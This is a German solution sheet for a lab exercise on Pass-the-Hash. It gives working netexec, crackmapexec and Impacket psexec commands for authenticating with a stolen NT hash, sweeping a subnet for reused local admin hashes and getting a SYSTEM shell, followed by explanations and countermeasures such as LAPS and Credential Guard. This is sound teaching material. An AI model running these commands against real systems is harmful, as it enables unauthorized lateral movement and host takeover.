# Lösung – Übung 09: Pass-the-Hash & Credential Reuse

`<ZIEL>` = Windows/SMB-Lab-Host, `<NT>` = NT-Hash (aus Übung 05/hashdump).

## 1. PtH an SMB

```bash
# netexec (Nachfolger von crackmapexec):
netexec smb <ZIEL> -u Administrator -H <NT> --local-auth
# crackmapexec:
crackmapexec smb <ZIEL> -u Administrator -H <NT> --local-auth
```
```
SMB  <ZIEL>  445  ...  [+] HOST\Administrator <NT> (Pwn3d!)
```
`(Pwn3d!)` = Admin-Zugriff per Hash, **ohne Klartext**. `--local-auth` = lokaler Account (nicht Domäne).

## 2. Credential Reuse über mehrere Hosts

```bash
netexec smb 192.168.56.0/24 -u Administrator -H <NT> --local-auth
```
Zeigt pro Host, wo derselbe Hash gilt. Viele `(Pwn3d!)` = identischer lokaler Admin auf der Flotte → ein Hash kompromittiert alle (**Credential Reuse**).

## 3. Shell per PtH

```bash
# Impacket:
psexec.py -hashes :<NT> Administrator@<ZIEL>
# oder netexec Command Execution:
netexec smb <ZIEL> -u Administrator -H <NT> --local-auth -x "whoami"
```
Impacket-`psexec` gibt eine SYSTEM-Shell. (`-hashes LM:NT`, LM-Teil kann leer/`:` sein.)

## 4. Warum PtH funktioniert

Das NTLM-Protokoll nutzt zur Authentifizierung den **NT-Hash als Geheimnis** (Challenge-Response darauf), nicht das Klartext-Passwort. Wer den Hash besitzt, kann die Authentifizierung durchführen, **ohne das Passwort zu kennen** – der Hash *ist* praktisch das Passwort-Äquivalent. Cracken ist nur nötig, wenn man den Klartext woanders braucht.

## 5. Gegenmaßnahmen

- **LAPS** / Windows LAPS: **eindeutige, rotierende** lokale Admin-Passwörter → kein Hash gilt auf zwei Hosts (stoppt Reuse/Lateral Movement).
- **Credential Guard** (isoliert Secrets per VBS), **LM/NTLM deaktivieren**, Kerberos.
- **Tiering / Privileged Access Workstations (PAW)**: Admin-Credentials nie auf niedrig vertrauenswürdigen Hosts.
- Segmentierung, **MFA**, Monitoring ungewöhnlicher Logons (Event-IDs), Least Privilege.

## Häufige Fehler / Troubleshooting

- **Kein Windows-Lab:** Teil konzeptionell durchspielen – NTLM-PtH gibt es unter Linux/Metasploitable nicht.
- **`STATUS_LOGON_FAILURE`:** falscher Hash/Feld (NT, nicht LM), `--local-auth` vergessen, Account existiert nicht.
- **`crackmapexec` veraltet:** `netexec` (nxc) ist der aktuelle Fork.
- **Kein `(Pwn3d!)`:** User ist kein lokaler Admin → nur Auth, keine Code-Execution.
